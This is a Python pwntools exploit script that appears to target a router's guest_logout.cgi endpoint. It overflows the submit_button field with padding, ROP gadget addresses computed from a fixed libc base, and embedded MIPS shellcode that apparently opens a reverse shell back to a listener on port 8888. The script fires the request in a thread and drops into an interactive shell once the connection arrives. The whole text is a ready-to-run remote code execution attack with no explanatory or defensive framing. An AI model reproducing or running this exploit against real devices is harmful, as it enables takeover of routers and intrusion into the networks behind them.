import requests,thread
from pwn import *
context(arch='mips',endian='little',os='linux')

io = listen(8888)
url="https://192.168.1.1/guest_logout.cgi"
ip = "192.168.1.101"

libc = 0x2af98000
jar_a0=0x0003D050+libc   #move $t9,$a0 
jar_s3=0x00025CAC+libc   #addiu $a0,$sp,0x38+var_10  

buf =  b""
buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c"
buf += b"\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0"
buf += b"\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
buf += b"\x01\x01"

payload= "status_guestnet.asp"
payload+= 'a'*61
payload+= p32(jar_a0)
payload+= 'a'*20
payload+= p32(jar_s3)
payload+= 'a'*0x18
payload+= buf
payload = {"cmac":"12:af:aa:bb:cc:dd","submit_button":payload,"cip":ip}

def attack():
    try:
        requests.post(url, data=payload, verify=False, timeout=1)
    except:
        pass
    

thread.start_new_thread(attack,())
io.wait_for_connection()
log.success("getshell")
io.interactive()
